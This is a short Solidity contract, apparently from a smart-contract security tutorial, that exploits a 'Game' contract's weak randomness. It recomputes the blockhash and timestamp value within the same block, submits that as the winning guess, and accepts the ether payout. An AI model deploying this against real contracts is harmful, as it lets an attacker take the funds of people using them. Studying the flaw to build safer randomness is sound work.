// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Game.sol";

contract RandomnessAttack {
    Game public game;

    constructor(address _game) {
        game = Game(_game);
    }

    /**
        attacks the `Game` contract by guessing the exact number because `blockhash` and `block.timestamp`
        is accessible publically
    */
    function attack() public {
        uint256 _guess = uint256(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
        game.guess(_guess);
    }

    // Gets called when the contract recieves ether
    receive() external payable {}
}
